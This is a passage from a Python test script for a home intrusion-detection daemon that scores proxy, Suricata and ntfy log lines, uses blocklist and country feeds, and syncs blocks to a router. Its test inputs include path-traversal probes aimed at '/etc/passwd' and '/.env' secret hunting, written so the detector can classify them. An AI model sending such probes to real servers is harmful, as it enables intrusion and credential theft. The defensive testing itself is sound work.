    _out = []
    for _sid in re.findall(r'sid:(\d+);', cmd):
        _out.append('alert ip x any -> y any (msg:"ET CINS group %s"; content:"abc"; '
                    'reference:cve,2021-44228; classtype:misc-attack; sid:%s; rev:7;)'
                    % (_sid, _sid))
    return '\n'.join(_out)


d.proxy_run = _one_grep
zigmon.CONFIG.update({'proxy_host': 'p',
                      'suricata_rules': '/var/lib/suricata/rules/suricata.rules'})
d._rules_said = {}
for _i in range(30):
    d.store.set_meta('ids_about_62.0.0.%d' % _i,
                     json.dumps({'sid': 2403300 + _i, 'confidence': 'High'}))
    d.store.block('62.0.0.%d' % _i, None, 'Suricata saw', auto=True)
d.store.flush()
_trips[0] = 0
_got = d.rules_fetch([2403300 + _i for _i in range(30)])
assert _trips[0] == 1, 'thirty rules took %d trips; one grep is the whole point' % _trips[0]
assert _got == 30, 'only %d of thirty rules were kept' % _got
# ...and asked again, nothing goes anywhere, because they are here
_trips[0] = 0
d.rules_fetch([2403300 + _i for _i in range(30)])
assert _trips[0] == 0, 'rules already in the database were fetched again'
# the list says what they look for, and costs nothing
_trips[0] = 0
d._rules_said = {}
_rows = d.blocked_list()
assert _trips[0] == 0, 'drawing the list went over SSH %d time(s)' % _trips[0]
_said = [r for r in _rows if ((r.get('ids') or {}).get('rule') or {}).get('looks_for')]
assert len(_said) >= 30, 'only %d row(s) say what the rule looks for' % len(_said)
# the CVE on the rule survived the round trip through the database
assert any('nvd.nist.gov' in _ref['where']
           for _ref in ((_said[0]['ids']['rule'].get('refs')) or [])), \
    'the reference on the rule was lost between the proxy and the database'
d.proxy_run = _two_logs
d.store.unblock()
d.forget_anomaly()
# ...including the rules for addresses blocked BEFORE any of this existed.
# Without it a house that upgrades sees "rule 2400015" on rows it has had for
# days and nothing beside it, because the rule was only ever fetched for lines
# read after the change.
d.store.db.execute('DELETE FROM ids_rules')
d.store.db.commit()
d._rules_said = {}
for _i, _sid in enumerate((2400015, 2403371, 2402000)):
    d.store.set_meta('ids_about_70.0.0.%d' % _i, json.dumps({'sid': _sid, 'confidence': 'High'}))
zigmon.CONFIG.update({'suricata_watch': 1, 'proxy_log': '', 'proxy_error_log': '',
                      'suricata_rules': '/var/lib/suricata/rules/suricata.rules'})


def _sweep_ssh(cmd, **kw):
    if 'stat ' in cmd or 'for f in' in cmd or 'tail' in cmd:
        return '0'
    return '\n'.join('alert ip x any -> y any (msg:"ET rule %s"; content:"aa"; sid:%s; rev:1;)'
                      % (_s, _s) for _s in re.findall(r'sid:(\d+);', cmd))


d.proxy_run = _sweep_ssh
d.proxy_sweep()
# every sid already on the list comes down, not only these three - earlier
# checks left their own behind, and picking those up too is the point
for _sid in (2400015, 2403371, 2402000):
    assert d.store.db.execute('SELECT 1 FROM ids_rules WHERE sid=?', (_sid,)).fetchone(), \
        'the rule for %d, already on the list, was not fetched by the sweep' % _sid
assert d.rule_about(2400015).get('msg'), 'the rule came down with no words in it'
zigmon.CONFIG['suricata_watch'] = 0
d.proxy_run = _two_logs
print('a sweep also fetches the rules for addresses blocked before any of this existed')
print('the rules come down with the logs, in one grep, and are read from the database after')
print('one rule, asked of the rules file, and nothing that is not a rule number or a path')
print('what Suricata said about an address is kept, and only a real CVE becomes a link')
print('what Suricata saw is weighed here, by how sure it is, and never against the house')
print('the notification server\u2019s full log is weighed by its own rules')
print('the full log weighs a body, a content-type and a header, and cannot be talked into lying')
# A path climbing out of where it is, in the ORDINARY log - which is the only
# place most requests are ever seen. "GET /../zigmon.py" was answered 400 and
# counted as a path that is not there, all day, which is not what it is.
for _req, _status, _kind in (
        ('GET /../zigmon.py HTTP/1.1', 400, 'proxy-payload'),
        ('GET /..%2f..%2fetc/passwd HTTP/1.1', 400, 'proxy-payload'),
        ('GET /%2e%2e/%2e%2e/x HTTP/1.1', 404, 'proxy-payload'),
        # ".env" used to be weighed as an ordinary path that is not there,
        # which is what let fourteen addresses hunting for keys stay under the
        # bar. It is its own thing now; a page nobody linked to still is not.
        ('GET /.env HTTP/1.1', 404, 'proxy-secret-hunt'),
        ('GET /nope.php HTTP/1.1', 404, 'proxy-poking'),
        ('GET /favicon.ico HTTP/1.1', 404, 'proxy-knocking')):
    _ip = '45.9.149.%d' % (abs(hash(_req)) % 200 + 20)
    d.store.unblock(_ip)
    d.forget_anomaly(_ip)
    _when = time.strftime('%d/%b/%Y:%H:%M:%S %z', time.localtime())
    d.proxy_weigh(['%s - - [%s] "%s" %s 0 "-" "-"' % (_ip, _when, _req, _status)])
    _c = [x for x in d.anomaly_state() if x['ip'] == _ip]
    _got = _c[0]['kinds'][0]['kind'] if _c and _c[0]['kinds'] else 'nothing'
    assert _got == _kind, '%r was read as %s, not %s' % (_req[:34], _got, _kind)
d.store.unblock()
d.forget_anomaly()
print('a path climbing out of where it is is read as what it is, in the ordinary log too')
print('an open-proxy try, an odd method and a guessed link secret are each their own thing')
# What the two lookups remember is held to a size - a day of logs is
# thousands of addresses and one entry apiece, kept for ever, is a leak. And
# emptying the memory must not take the answer that was just put in it with
# it: that threw a KeyError on the very next line, every four thousand
# addresses, in the middle of a sweep of the logs.
zigmon.CONFIG.update({'feeds': 'probe', 'geo': 1})
d.store.put_feed('probe', [_r for _r in (zigmon.range_of('45.9.0.0/16'),) if _r])
d.store.put_geo([(zigmon.pack_address('45.9.0.0')[0],
                  zigmon.pack_address('45.9.255.255')[0], 4, 'XX')])
# the daemon only asks again whether there IS a country list once a minute,
# so a rig that fills the table has to say so
d._feed_said, d._geo_said, d._geo_any, d._geo_asked = {}, {}, True, 0
for _i in range(9000):
    _ip = '10.%d.%d.%d' % (_i // 65536 % 256, _i // 256 % 256, _i % 256)
    d.feed_says(_ip)
    d.country_says(_ip)
assert len(d._feed_said) <= 4001, 'the lists memory grew to %d' % len(d._feed_said)
assert len(d._geo_said) <= 4001, 'the country memory grew to %d' % len(d._geo_said)
assert d.feed_says('45.9.148.9') == 'probe', 'the lists memory stopped answering'
assert d.country_says('45.9.148.9') == 'XX', 'the country memory stopped answering'
d.store.put_feed('probe', [])
d.store.put_geo([])
zigmon.CONFIG.update({'feeds': '', 'geo': 0})
d._feed_said, d._geo_said, d._geo_any = {}, {}, False
# Somebody walking a /16 with one knock apiece: the counter itself has had a
# ceiling since the beginning, but what was remembered ABOUT those addresses -
# where each was seen, when each was last kept out - had none, so twenty
# thousand entries sat there while the counter stayed at five hundred.
_was_bar = zigmon.CONFIG.get('block_score')
zigmon.CONFIG.update({'block_score': 999, 'never_block': '', 'block_private': 'never',
                      'proxy_host': 'p'})
_walk_when = time.strftime('%d/%b/%Y:%H:%M:%S %z', time.localtime())
d.proxy_weigh(['20.%d.%d.%d - - [%s] "GET /.env HTTP/1.1" 404 0 "-" "-"'
               % (_i // 65536 % 256, _i // 256 % 256, _i % 256, _walk_when)
               for _i in range(6000)])
assert len(d._anomaly) <= 500, 'the counter grew to %d' % len(d._anomaly)
# the sweep drops a hundred when it crosses five hundred, so these sit a
# little above it between sweeps - what matters is that they are BOUNDED,
# not that they match to the entry
assert len(d._anomaly_from) <= 700, \
    'where each was seen grew to %d; a stranger chooses how big that gets' % len(d._anomaly_from)
assert len(getattr(d, '_blocked_times', {})) <= 700, \
    'when each was last kept out grew to %d' % len(getattr(d, '_blocked_times', {}))
# ...and a counter still standing still knows where it was seen
_one = [k for k in d._anomaly][0]
assert d._anomaly_from.get(_one) == 'proxy', \
    'clearing what was remembered took it from a counter that is still there'
zigmon.CONFIG['block_score'] = _was_bar
zigmon.CONFIG['block_private'] = 'gently'
d.forget_anomaly()
d.store.unblock()
print('what is remembered about an address is held to the same size as the counter itself')
print('what the lookups remember is held to a size, and still answers when it is emptied')
# Every list the card offers must be one the daemon can actually fetch and
# parse - a name and a URL typed in by hand is a switch that does nothing
# until somebody presses it and reads the log.
_names = [n for n, _s, _w, _u in d.FEEDS]
assert len(set(_names)) == len(_names), 'two lists share a name: %r' % _names
for _n, _short, _what, _url in d.FEEDS:
    assert _url.startswith('https://'), '%s is fetched over something other than https' % _n
    assert _short and _what, '%s has no name or no word about what it is' % _n
print('%d lists, each named once and fetched over https' % len(d.FEEDS))
# The blocked card asks which lists know each address, for every row, twice a
# second. A hundred rows was a hundred queries for something that only changes
# when a list is fetched - so it is remembered, and dropped when one is.
_seen_by = {}
d.store.put_feed('probe', [_r for _r in (zigmon.range_of('45.9.0.0/16'),) if _r])
_first = d.store.feeds_with('45.9.148.9', _seen_by)
assert _first == ['probe'], 'the remembered answer is wrong: %r' % _first
assert d.store.feeds_with('45.9.148.9', _seen_by) == _first, 'asking twice gave two answers'
assert '45.9.148.9' in _seen_by, 'nothing was remembered at all'
d.store.put_feed('probe', [])
assert d.store.feeds_with('45.9.148.9') == [], 'a list emptied still names the address'
assert not d._feeds_on and not d._feed_said, \
    'fetching a list left what was remembered about the old one standing'
print('which lists know an address is remembered for a drawing, and dropped when one is fetched')
print('a lookup in the lists is a seek, whatever is in them')
print('the forwarded chain is read from the right, and a list may not be the whole internet')
# copytruncate, which is how ntfy's own two files are rotated: the file is
# copied beside itself and then EMPTIED IN PLACE, because ntfy holds it open
# and is never told to reopen it. Four things have to hold.
_ntfy_files = {'/var/lib/ntfy/ntfy.log':
               ''.join('WARN Invalid token (visitor_ip=45.9.148.%d, http_status=401)\n' % _i
                       for _i in range(10))}


def _ntfy_run(cmd):
    if cmd.startswith('for f in'):
        return '\n'.join(sorted(k for k in _ntfy_files
                                if ('.1' in k or '-2026' in k) and not k.endswith('.gz')))
    _which = [k for k in _ntfy_files if k in cmd]
    if not _which:
        return ''
    _body = _ntfy_files[max(_which, key=len)]
    if cmd.startswith('stat'):
        return str(len(_body.encode()))
    _at = int(cmd.split('+')[1].split()[0]) - 1
    return _body[_at:_at + 2000000]


zigmon.CONFIG.update({'proxy_host': 'p', 'ntfy_own_log': '/var/lib/ntfy/ntfy.log'})
d.proxy_run = _ntfy_run
d.store.set_meta('ntfy_own_at', '0')
d.store.set_meta('ntfy_own_at_drained', '')
_one = lambda: len(d.proxy_read_named('ntfy_own_log', 'ntfy_own_at'))
assert _one() == 10, 'the first reading did not read the file'
_ntfy_files['/var/lib/ntfy/ntfy.log'] += 'WARN Invalid token (visitor_ip=45.9.148.98)\n'
_ntfy_files['/var/lib/ntfy/ntfy.log.1'] = _ntfy_files['/var/lib/ntfy/ntfy.log']
_ntfy_files['/var/lib/ntfy/ntfy.log'] = 'WARN Invalid token (visitor_ip=45.9.148.50)\n'
assert _one() == 2, 'copytruncate lost the line written before the copy, or read it twice'
_ntfy_files['/var/lib/ntfy/ntfy.log'] = ''
assert _one() == 0, 'the copy beside it was drained a second time'
_ntfy_files['/var/lib/ntfy/ntfy.log'] = 'WARN Invalid token (visitor_ip=45.9.148.77)\n'
assert _one() == 1, 'a line written after a rotation looked like one already read'
# a compressed copy is passed over rather than tailed as binary rubbish
_ntfy_files['/var/lib/ntfy/ntfy.log.1.gz'] = 'BINARY'
_ntfy_files['/var/lib/ntfy/ntfy.log'] = ''
assert _one() == 0, 'something was read out of a compressed copy'
d.proxy_run = _two_logs
zigmon.CONFIG.update({'proxy_host': '', 'ntfy_own_log': ''})
# A file being written to ends mid-line as often as not: eve.json sat at 764
# bytes with no newline on it, which was one whole alert. Reading to there and
# moving the mark past it loses that line for good, because the rest of it
# arrives after the place we said we had got to.
_half = {'/var/log/suricata/eve.json': '{"a":1}\n{"b":2}\n{"c":3'}


def _half_run(cmd):
    if cmd.startswith('for f in'):
        return ''
    _body = _half['/var/log/suricata/eve.json']
    if cmd.startswith('stat'):
        return str(len(_body.encode()))
    _at = int(cmd.split('+')[1].split()[0]) - 1
    return _body[_at:_at + 2000000]


d.proxy_run = _half_run
zigmon.CONFIG.update({'proxy_host': 'p', 'suricata_log': '/var/log/suricata/eve.json'})
d.store.set_meta('suricata_at', '0')
_first = d.proxy_read_named('suricata_log', 'suricata_at')
assert _first == ['{"a":1}', '{"b":2}'], \
    'a line still being written was read half done: %r' % _first
_half['/var/log/suricata/eve.json'] += '}\n{"d":4}\n'
_then = d.proxy_read_named('suricata_log', 'suricata_at')
assert _then == ['{"c":3}', '{"d":4}'], \
    'the rest of the half line did not come back whole: %r' % _then
d.proxy_run = _two_logs
zigmon.CONFIG.update({'proxy_host': '', 'suricata_log': ''})
print('a line still being written is left for next time, and read whole')
print('a log rotated by copytruncate loses nothing and is read once')
print('a rotated log loses nothing, and our own server being down is said once, not weighed')
print('one sweep reads both logs, each from its own path')
# The notification server's own access log, which needs narrower rules than
# the one-tap road's. Real lines from a real one: a browser opening an address
# whose web app is switched off gets a four hundred for every part it asks
# for, and a phone with read-only access gets a 403 for trying to publish.
# Weighing either keeps the house out of its own notifications.
zigmon.CONFIG.update({'blacklist': 1, 'block_score': 15, 'block_sensitivity': 'normal',
                      'never_block': '', 'block_ladder': '', 'proxy_host': 'p'})
_was_same, zigmon.Daemon.SAME_TRY_WITHIN = zigmon.Daemon.SAME_TRY_WITHIN, 0
d.store.unblock()
d.forget_anomaly()
_browser = ['46.227.172.22 - - [16/Sep/2026:16:10:%02d +0200] "GET /%s HTTP/2.0" 404 0 "-" "Mozilla/5.0"'
            % (_i, _p) for _i, _p in enumerate(
                ['config.js', 'sw.js', 'manifest.webmanifest', 'settings', 'favicon.ico',
                 'static/langs/en-US.json', '', 'config.js', 'sw.js', 'manifest.webmanifest'])]
_phone = ['192.168.40.170 - - [16/Sep/2026:16:25:%02d +0200] "POST /zigmon-house HTTP/2.0" 403 0 "-" "ntfy/1.7.0"'
          % _i for _i in range(5)]
_guess = ['45.9.148.7 - - [16/Sep/2026:09:00:%02d +0200] "GET /zigmon-house/json HTTP/1.1" 401 0 "-" "-"'
          % _i for _i in range(6)]
_weighed = d.ntfy_weigh(_browser + _phone + _guess)
assert '46.227.172.22' not in _weighed, 'a browser was weighed for a web app that is switched off'
assert '192.168.40.170' not in _weighed, 'a client of the house was weighed for being refused'
assert _weighed.get('45.9.148.7') == 6, 'tries with no name were not weighed: %r' % _weighed
_out = [r['ip'] for r in d.blocked_list()]
assert '45.9.148.7' in _out, 'six tries with no name earned no block'
assert '46.227.172.22' not in _out and '192.168.40.170' not in _out, \
    'the house was kept out of its own notifications: %r' % _out
zigmon.Daemon.SAME_TRY_WITHIN = _was_same
zigmon.CONFIG['proxy_host'] = ''
d.store.unblock()
d.forget_anomaly()
# Two ways the tap log kept the house out of its own house. Real lines again.
d.store.unblock()
d.forget_anomaly()
_mine = ['46.227.172.22 - - [16/Sep/2026:12:00:%02d +0200] "GET /tap HTTP/2.0" 405 0 "-" "Mozilla/5.0"'
         % _i for _i in range(8)]
_mine += ['46.227.172.22 - - [16/Sep/2026:12:01:%02d +0200] "GET /favicon.ico HTTP/2.0" 404 0 "-" "Mozilla/5.0"'
          % _i for _i in range(8)]
_pressed = ['89.24.57.142 - - [16/Sep/2026:12:02:%02d +0200] "POST /tap HTTP/2.0" 403 0 "-" "Shortcuts"'
            % _i for _i in range(9)]
# The event, not the address: knocking once or twice is nothing, and the same
# knocking forty times is a flood. Refusing to weigh it at all - which is what
# 4.12.1 did - let three hundred knocks at one road through untouched.
zigmon.CONFIG.update({'block_score': 15, 'block_sensitivity': 'normal'})
d.proxy_weigh(_mine)
_score = {c['ip']: c['score'] for c in d.anomaly_state()}
assert _score.get('46.227.172.22', 0) <= 16, \
    'a browser having a look is weighed like a scanner: %r' % _score
assert '46.227.172.22' not in [r['ip'] for r in d.blocked_list()], \
    'sixteen knocks earned a block; a browser does that by being opened twice'
d.store.unblock()
d.forget_anomaly()
_was_fold, zigmon.Daemon.SAME_TRY_WITHIN = zigmon.Daemon.SAME_TRY_WITHIN, 0
_banging = ['203.0.113.70 - - [16/Sep/2026:12:00:%02d +0200] "GET /tap HTTP/2.0" 405 0 "-" "-"'
            % (_i % 60) for _i in range(40)]
d.proxy_weigh(_banging)
assert '203.0.113.70' in [r['ip'] for r in d.blocked_list()], \
    'forty knocks at the one road in a minute are still let by'
zigmon.Daemon.SAME_TRY_WITHIN = _was_fold
d.store.unblock()
d.forget_anomaly()
d.proxy_weigh(_pressed[:1])
assert '89.24.57.142' not in [r['ip'] for r in d.blocked_list()], \
    'one refused press earned a block'
# ...and a stranger walking paths still is
zigmon.CONFIG.update({'block_score': 15, 'block_sensitivity': 'normal', 'blacklist': 1,
                      'never_block': '', 'block_ladder': ''})
_walker = ['203.0.113.60 - - [16/Sep/2026:12:03:%02d +0200] "GET /.env%d HTTP/1.1" 404 0 "-" "-"'
           % (_i, _i) for _i in range(12)]
_weighed = d.proxy_weigh(_walker)
assert _weighed.get('203.0.113.60') == 12, 'a walker of paths is no longer weighed: %r' % _weighed
assert '203.0.113.60' in [r['ip'] for r in d.blocked_list()], 'and is not kept out'
d.store.unblock()
d.forget_anomaly()
# A line read out of a log carries its own moment. Without it every line of a
# reading happens at the same instant, and the folding - there so a browser
# retrying twice counts once - folds a flood of identical knocks into one.
# Which is how three hundred knocks at one road stopped being noticed.
zigmon.CONFIG.update({'blacklist': 1, 'block_score': 15, 'block_sensitivity': 'normal',
                      'never_block': '', 'block_ladder': '', 'block_private': 'gently',
                      'proxy_host': 'p'})


def _knocks(ip, many, apart, status='405'):
    _out = []
    for _i in range(many):
        _when = time.strftime('%d/%b/%Y:%H:%M:%S %z',
                              time.localtime(time.time() - 400 + _i * apart))
        _out.append('%s - - [%s] "GET /tap HTTP/2.0" %s 0 "-" "-"' % (ip, _when, status))
    return _out


def _score_of(ip):
    _c = [x for x in d.anomaly_state() if x['ip'] == ip]
    return _c[0]['score'] if _c else 0


d.store.unblock()
d.forget_anomaly()
d.proxy_weigh(_knocks('45.9.148.80', 40, 5))
assert _score_of('45.9.148.80') >= 30, \
    'forty knocks five seconds apart weigh %d - they are being folded into one' % _score_of('45.9.148.80')
assert '45.9.148.80' in [r['ip'] for r in d.blocked_list()], 'and earn no block'
d.store.unblock()
d.forget_anomaly()
d.proxy_weigh(_knocks('45.9.148.81', 3, 0))
assert _score_of('45.9.148.81') <= 2, \
    'three knocks in the same second weigh %d; they are one try' % _score_of('45.9.148.81')
assert '45.9.148.81' not in [r['ip'] for r in d.blocked_list()], 'and earned a block'
d.store.unblock()
d.forget_anomaly()
# The question a single line cannot answer. Every line read off the server in
# front is kept as a row, so the weighing can ask how many DIFFERENT things an
# address wanted in an hour - which is the difference between a watch with a
# stale shortcut and somebody working through a list, and which no line says
# on its own.
zigmon.CONFIG.update({'proxy_spread_bar': 30, 'proxy_lines_days': 30,
                      'block_score': 15, 'block_sensitivity': 'normal', 'never_block': '',
                      'block_ladder': '', 'block_private': 'gently'})
d.store.unblock()
d.forget_anomaly()
d.store.db.execute('DELETE FROM proxy_lines')
d.store.db.commit()


def _asked(ip, path, status='404', ago=0):
    _when = time.strftime('%d/%b/%Y:%H:%M:%S %z', time.localtime(time.time() - ago))
    return '%s - - [%s] "GET %s HTTP/1.1" %s 0 "-" "-"' % (ip, _when, path, status)


d.proxy_weigh([_asked('45.9.148.30', '/tap', '405', _i * 20) for _i in range(60)])
d.proxy_weigh([_asked('45.9.148.31', '/a%d.php' % _i, '404', _i * 20) for _i in range(40)])
_n, _spread = d.store.paths_in('45.9.148.30', 3600)
assert _n == 60 and _spread == 1, 'the lines were not kept: %d line(s), %d path(s)' % (_n, _spread)
_n, _spread = d.store.paths_in('45.9.148.31', 3600)
assert _spread == 40, 'the spread was not seen: %d path(s)' % _spread
_out = [r['ip'] for r in d.blocked_list()]
assert '45.9.148.31' in _out, 'forty different paths in an hour is not noticed'
assert '45.9.148.30' not in _out, 'one path asked for sixty times was taken for a sweep'
# and the rows do not pile up for ever
d.store.db.execute('UPDATE proxy_lines SET ts = ?', (time.time() - 90 * 86400,))
d.store.db.commit()
assert d.store.proxy_lines_forget(30) >= 100, 'old lines are never forgotten'
assert d.store.db.execute('SELECT COUNT(*) FROM proxy_lines').fetchone()[0] == 0, \
    'and some were left behind'
d.store.unblock()
d.forget_anomaly()
# Lists somebody else keeps. Two things have to hold: an address is found in
# a range whichever family it belongs to, and being on a list is not by itself
# a reason to keep anybody out - it only makes what they do here weigh more.
zigmon.CONFIG.update({'feeds': '', 'feeds_weight': 3, 'block_score': 15,
                      'block_sensitivity': 'normal', 'never_block': '', 'block_ladder': '',
                      'block_private': 'gently'})
_kept = [_r for _r in (zigmon.range_of(_c) for _c in
                       ('45.9.148.0/24', '2001:db8::/32', '203.0.113.7', '# a comment', 'rubbish'))
         if _r]
assert len(_kept) == 3, 'a comment or a piece of rubbish was read as a range: %d' % len(_kept)
d.store.put_feed('firehol1', _kept)
assert d.store.feed_sizes().get('firehol1') == 3, 'the list was not kept'
for _in, _out in (('45.9.148.9', True), ('45.9.149.1', False), ('2001:db8::abcd', True),
                  ('2001:db9::1', False), ('203.0.113.7', True), ('8.8.8.8', False)):
    _found = bool(d.store.in_any_feed(_in))
    assert _found == _out, '%s was %s in the list' % (_in, 'found' if _found else 'not found')


def _weigh(ip, tries=3):
    d.store.unblock(ip)
    d.forget_anomaly(ip)
    for _i in range(tries):
        d.note_anomaly(ip, 'proxy-poking', '/x%d' % _i, source='proxy')
    _c = [x for x in d.anomaly_state() if x['ip'] == ip]
    return (_c[0]['score'] if _c else 0), any(r['ip'] == ip for r in d.blocked_list())


_was_same, zigmon.Daemon.SAME_TRY_WITHIN = zigmon.Daemon.SAME_TRY_WITHIN, 0
_plain, _ = _weigh('45.9.148.9')
zigmon.CONFIG['feeds'] = 'firehol1'
d._feed_said = {}
_listed, _kept_out = _weigh('45.9.148.9')
_other, _ = _weigh('8.8.8.8')
assert _listed == _plain * 3, 'a listed address does not weigh more: %d against %d' % (_listed, _plain)
assert _other == _plain, 'an address on no list was weighed differently: %d' % _other
assert _kept_out, 'three tries from a listed address did not reach the bar'
# ...and the number shown is the number that decided
_shown = [x for x in d.anomaly_state() if x['ip'] == '45.9.148.9'][0]['score']
assert _shown == _listed, 'the card shows %d while %d decided' % (_shown, _listed)
zigmon.Daemon.SAME_TRY_WITHIN = _was_same
zigmon.CONFIG['feeds'] = ''
d._feed_said = {}
d.store.unblock()
d.forget_anomaly()
# Nothing of a list goes to the router in advance - four thousand ranges are
# not a firewall rule - but the first address off one that turns up in a log
# is kept out for good there and then, and only that one address is sent.
zigmon.CONFIG.update({'feeds': 'firehol1', 'feeds_ban': 1, 'block_ladder': '10, 60, 1440, forever'})
d._feed_said = {}
d.store.unblock()
d.forget_anomaly()
_to_router = set()


def _router(cmd):
    if 'print terse' in cmd:
        return ''.join('%d list=z address=%s comment="zigmon: x"\n' % (_i, _a)
                       for _i, _a in enumerate(sorted(_to_router)))
    _m = re.search(r'address=([0-9a-fA-F:.]+)', cmd)
    if _m and 'add' in cmd:
        _to_router.add(_m.group(1))
    return ''


_was_run, d.mikrotik_run = d.mikrotik_run, _router
zigmon.CONFIG.update({'mikrotik_host': 'r', 'mikrotik_list': 'z', 'mikrotik_sync': 1})
assert not _to_router, 'something was sent to the router before anybody did anything'
d.note_anomaly('45.9.148.9', 'proxy-poking', 'GET /.env', source='proxy')
_row = [r for r in d.blocked_list() if r['ip'] == '45.9.148.9']
assert _row, 'one thing from a listed address earned nothing'
assert _row[0]['forever'], 'a listed address was kept out only for a while'
assert _row[0]['from_feed'] == 'firehol1', 'the row does not say which list knew it'
assert 'firehol1' in (_row[0]['how'] or ''), 'nor why it is for good: %r' % _row[0]['how']
# the router follows on a thread of its own, so that nothing waits on a router
# that is slow or away - which means waiting for it here
for _try in range(40):
    if _to_router:
        break
    time.sleep(0.05)
assert _to_router == {'45.9.148.9'}, \
    'the router was sent %r rather than the one address' % _to_router
# and an address on no list is not kept out for one thing
d.note_anomaly('8.8.8.8', 'proxy-poking', 'GET /.env', source='proxy')
assert '8.8.8.8' not in [r['ip'] for r in d.blocked_list()], \
    'one poke from an address on no list earned a block'
d.mikrotik_run = _was_run
zigmon.CONFIG.update({'feeds': '', 'mikrotik_host': '', 'mikrotik_sync': 0, 'block_ladder': ''})
d._feed_said = {}
d.store.unblock()
d.forget_anomaly()
# The country list, and the one question somebody actually has about an
# address they do not recognise. The list itself is fetched from db-ip, which
# cannot be reached from where these run, so the rows are put in by hand in
# exactly the shape the fetching builds them.
d.store.put_geo([
    (zigmon.pack_address('8.8.8.0')[0], zigmon.pack_address('8.8.8.255')[0], 4, 'US'),
    (zigmon.pack_address('89.24.0.0')[0], zigmon.pack_address('89.24.255.255')[0], 4, 'CZ'),
    (zigmon.pack_address('2a02:7a00::')[0], zigmon.pack_address(
        '2a02:7a00:ffff:ffff:ffff:ffff:ffff:ffff')[0], 6, 'CZ'),
])
assert d.store.geo_size() == 3, 'the country list was not kept'
for _ip, _cc in (('8.8.8.8', 'US'), ('89.24.57.142', 'CZ'), ('2a02:7a00::1', 'CZ'),
                 ('1.2.3.4', None)):
    _said = d.store.country_of(_ip)
    assert _said == _cc, '%s came back as %r rather than %r' % (_ip, _said, _cc)
# ...and everything known about one address, in one answer
zigmon.CONFIG.update({'geo': 1, 'feeds': 'firehol1', 'feeds_ban': 1})
d._feed_said = {}
d._geo_said = {}
d.store.unblock()
d.forget_anomaly()
d.store.put_feed('firehol1', [_r for _r in (zigmon.range_of('89.24.0.0/16'),) if _r])
_when = time.strftime('%d/%b/%Y:%H:%M:%S %z', time.localtime())
d.proxy_weigh(['89.24.57.142 - - [%s] "GET /.env HTTP/1.1" 404 0 "-" "-"' % _when])
_one = d.address_story('89.24.57.142')
assert _one['country'] == 'CZ', 'the story does not say which country: %r' % _one['country']
assert _one['feed'] == 'firehol1', 'nor which list knows it: %r' % _one['feed']
assert _one['blocked'] and _one['forever'], 'nor that it is kept out for good'
assert _one['lines'] == 1 and _one['asked'][0]['path'] == '/.env', \
    'nor what it actually asked for: %r' % _one.get('asked')
assert _one['known'], 'it says nothing is known about an address it has just kept out'
_none = d.address_story('1.2.3.4')
assert not _none['known'] and not _none['feed'], \
    'an address never seen here is said to be known: %r' % _none
assert d.address_story('not an address').get('error'), 'rubbish was taken for an address'
zigmon.CONFIG.update({'geo': 0, 'feeds': ''})
d._feed_said = {}
d.store.unblock()
d.forget_anomaly()
print('a country is said beside an address, and one address answers for everything known about it')
# Whatever is written has to be CALLED. Both of these were written and
# neither was reached from the clock, so a house that switched four lists on
# and asked for them every hour sat with what it had fetched by hand.
_asked = []
_was_feed, _was_geo = d.feed_fetch, d.geo_fetch
d.feed_fetch = lambda which: (_asked.append(which), (0, 'not really'))[1]
d.geo_fetch = lambda: (_asked.append('geo'), (0, 'not really'))[1]
zigmon.CONFIG.update({'feeds': 'firehol1', 'feeds_every_h': 1, 'geo': 1, 'geo_every_d': 1})
d.store.set_meta('feed_at_firehol1', '0')
d.store.set_meta('geo_at', '0')
d.feeds_due()
d.geo_due()
assert _asked == ['firehol1', 'geo'], 'nothing was fetched when it was due: %r' % _asked
_asked[:] = []
d.store.set_meta('feed_at_firehol1', str(int(time.time())))
d.store.set_meta('geo_at', str(int(time.time())))
d.feeds_due()
d.geo_due()
assert not _asked, 'something just fetched was fetched again: %r' % _asked
d.store.set_meta('feed_at_firehol1', str(int(time.time() - 2 * 3600)))
d.feeds_due()
assert _asked == ['firehol1'], 'a list two hours old was not fetched again: %r' % _asked
# ...and the clock really reaches them
_clock = open(str(_Path(__file__).resolve().parent.parent / 'zigmon.py')).read()
assert 'self.feeds_due()' in _clock and 'self.geo_due()' in _clock, \
    'the clock never calls them, so nothing is ever fetched by itself'
d.feed_fetch, d.geo_fetch = _was_feed, _was_geo
zigmon.CONFIG.update({'feeds': '', 'geo': 0})
print('the lists are fetched when they are due, and not when they are not')
print('a listed address that knocks is kept out for good, and only it is sent to the router')
print('a list somebody else keeps makes what an address does weigh more, and only that')
print('what the logs said is kept, and asked the question no single line answers')
print('a line is weighed at the moment it says it happened, so a flood counts as a flood')
print('a browser at the door and a press the house refused are not weighed; a walker of paths is')
# ntfy's own two files, which are its own doing rather than nginx's: the
# server's log, and the feed it appends every address it has refused often
# enough to judge. A line in the feed is a decision already made.
zigmon.CONFIG.update({'blacklist': 1, 'block_score': 15, 'block_sensitivity': 'normal',
                      'never_block': '', 'block_ladder': '', 'proxy_host': 'p'})
d.store.unblock()
d.forget_anomaly()
_now_z = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
_feed = ['%s 45.9.148.9 45.9.148.9/32 429 42901' % _now_z,
         '%s 45.9.148.9 45.9.148.9/32 401 40101' % _now_z,
         '%s 45.9.148.9 45.9.148.9/32 403 40301' % _now_z,
         '%s 2001:db8::abcd 2001:db8::/64 429 42909' % _now_z,
         'this is not a line of anything']
_weighed = d.ntfy_own_weigh(_feed, banned=True)
assert _weighed.get('45.9.148.9') == 3, 'the ban feed was not read: %r' % _weighed
assert _weighed.get('2001:db8::abcd') == 1, 'an IPv6 address in the feed was missed: %r' % _weighed
assert '45.9.148.9' in [r['ip'] for r in d.blocked_list()], \
    'three lines of the ban feed earned no block'
d.store.unblock()
d.forget_anomaly()
_own = ['INFO Listening on 127.0.0.1:2586[http], ntfy 2.28.0 (tag=startup)',
        'INFO Server stats (messages_cached=18, messages_published=17, users=3, visitors=1)',
        'WARN Rate limit exceeded (visitor_ip=45.9.148.10, visitor_id=ip:45.9.148.10)',
        'WARN Invalid or expired token (visitor_ip=45.9.148.10, http_status=401)',
        'INFO HTTP request finished (visitor_ip=192.168.40.170, http_status=200)']
_weighed = d.ntfy_own_weigh(_own)
assert _weighed.get('45.9.148.10') == 2, 'the complaints in its own log were missed: %r' % _weighed
assert '192.168.40.170' not in _weighed, 'a request that worked was weighed: %r' % _weighed
assert len(_weighed) == 1, 'the chatter about stats and startup was weighed: %r' % _weighed
d.store.unblock()
d.forget_anomaly()
zigmon.CONFIG['proxy_host'] = ''
print('ntfy\u2019s own log and its ban feed are read, and its chatter is left alone')
